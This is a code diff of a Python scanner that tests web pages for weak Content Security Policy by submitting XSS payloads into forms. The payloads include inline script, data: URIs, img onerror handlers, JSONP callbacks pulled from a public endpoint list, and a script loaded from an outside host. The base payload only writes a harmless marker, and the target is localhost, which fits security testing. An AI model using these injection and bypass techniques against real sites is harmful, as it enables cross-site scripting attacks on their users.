@@ -1,6 +1,6 @@
 #! /usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Author             : Ruulian
+# Author             : @Ruulian_
 # Date created       : None
 
 import argparse
@@ -11,20 +11,15 @@ import time
 from requests_html import HTMLSession
 from selenium import webdriver
 import selenium
+import random
 
 general_payload = "document.write(atob('PHAgaWQ9dGVzdGluZ19qc19leHBsb2l0X3BhcmFtPnRlc3Q8L3A+'))"
 
 exploits_dic = {
-    "script-src 'unsafe-inline'" : [
-        f'<script>{general_payload}</script>',
-        f'<img src=# onerror="{general_payload}">'
-    ],
-    "script-src data:" : [
-        f'<script src="data:,{general_payload}"></script>'
-    ],
-    "script-src *" : [
-        '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'
-    ]
+    "script-src 'unsafe-inline'" : f'<script>{general_payload}</script>',
+    "script-src data:" : f'<script src="data:,{general_payload}"></script>',
+    "default-src *. " : f"<script src=jsonp></script>",
+    "script-src *" : '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'
 }
 
 def date_formatted():
@@ -33,21 +28,39 @@ def date_formatted():
 def escape(string:str):
     return string.translate(str.maketrans({" ":".+", "*":"\*", ".":"\.","/":"\/"}))
 
-class Colors:
-    # Foreground:
-    FAIL = '\033[95m'
-    BLUE = '\033[94m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    ERROR = '\033[91m'
+def get_jsonp(policy):
+    sess = HTMLSession()
+    jsonbee = sess.get("https://raw.githubusercontent.com/zigoo0/JSONBee/master/jsonp.txt").text.splitlines()
+    r = re.compile(r"(\w+\.\w+)")
+    url = r.search(policy).group(1)
+    endpoints = []
+    for line in jsonbee:
+        if url in line:
+            endpoint = re.search('src="(.+)"', line).group(1)
+            endpoints.append(re.sub(r"(?<=callback=).*$", general_payload, endpoint))
+    return endpoints
 
-    # Formatting
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'    
-    
-    # End colored text
-    END = '\033[0m'
-    NC ='\x1b[0m' # No Color    
+def construct_payloads(payload:str, jsonp=[]):
+    constructed = []
+
+    # Case Modify
+    modified = payload
+    tags = re.findall(r"(<.\w+\W)", payload)
+    for tag in tags:
+        modified = modified.replace(tag, tag.upper())
+    constructed.append(modified)
+
+    # Tag modified
+    r = re.compile(r"<script>(.+)</script>")
+    js = r.search(payload)
+    if js is not None:
+        constructed.append(f"<img src=# onerror={js.group(1)}>")
+
+    # All jsonp endpoints
+    for endpoint in jsonp:
+        constructed.append(f'<script src={endpoint}></script>')
+        
+    return constructed
 
 class Scanner:
     def __init__(self, target, no_colors=False, dynamic=False, all_pages=False):
@@ -69,19 +82,19 @@ class Scanner:
         print(message)
 
     def succeed(self, message=""):
-        self.print(f"[{Colors.GREEN}SUCCEED{Colors.END}] {message}")
+        self.print(f"[\033[92mSUCCEED\033[0m] {message}")
 
     def info(self, message=""):
-        self.print(f"[{Colors.BLUE}{date_formatted()}{Colors.END}] {message}")
+        self.print(f"[\033[94m{date_formatted()}\033[0m] {message}")
     
     def vuln(self, message=""):
-        self.print(f"[{Colors.YELLOW}VULN{Colors.END}] {message}")
+        self.print(f"[\033[93mVULN\033[0m] {message}")
 
     def fail(self, message=""):
-        self.print(f"[{Colors.FAIL}FAIL{Colors.END}] {message}")
+        self.print(f"[\033[95mFAIL\033[0m] {message}")
 
     def error(self, message=""):
-        self.print(f"[{Colors.ERROR}ERROR{Colors.END}] {message}")
+        self.print(f"[\033[91mERROR\033[0m] {message}")
 
     def get_all_pages(self, page):
         r = self.sess.get(page)
@@ -99,6 +112,7 @@ class Page:
         self.url = url
         self.sess = HTMLSession()
         self.csp = self.get_csp()
+        self.jsonp = []
 
     def get_csp(self):
         r = self.sess.get(self.url)
@@ -121,7 +135,10 @@ class Page:
             for policy in self.csp:
                 if r.match(policy):
                     self.vuln = policy
-                    self.payload = exploit[0]
+                    if "jsonp" in exploit:
+                        self.jsonp = get_jsonp(policy)
+                        exploit = exploit.replace("jsonp", random.choice(self.jsonp))
+                    self.payload = exploit
                     return True
         return False
             
@@ -185,7 +202,7 @@ def parse_args():
 if __name__ == '__main__':
     #args = parse_args()
     #scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic, all_pages=args.all_pages)
-    scan = Scanner("http://localhost/0/", all_pages=True, dynamic=True)
+    scan = Scanner("http://localhost/1/", all_pages=False, dynamic=True)
 
     scan.info(f"Starting scan on target {scan.target}\n")
     
@@ -219,21 +236,18 @@ if __name__ == '__main__':
                                     payload = page.payload
                                 else:
                                     scan.fail("Potential exploit failed")
-                                    scan.info("Trying all payloads")
-
-                                    for exploits in exploits_dic.values():
-                                        for exploit in exploits:
-                                            if new_form.exploit(exploit):
-                                                exploitable = True
-                                                payload = exploit
-                                                break
-                                        if exploitable:
+                                    scan.info("Trying constructing payload...")
+                                    payloads_constructed = construct_payloads(page.payload, page.jsonp)
+                                    for payload_generated in payloads_constructed:
+                                        if new_form.exploit(payload_generated):
+                                            exploitable = True
+                                            payload = payload_generated
                                             break
                                 if exploitable:
                                     scan.succeed(f"Payload found on {page.url}")
                                     scan.succeed(f"Payload: {payload}\n")
                                 else:
-                                    scan.fail("No exploit found")
+                                    scan.fail("No exploit found\n")
                         else:
                             scan.fail(f"No exploit found\n")
                     else:
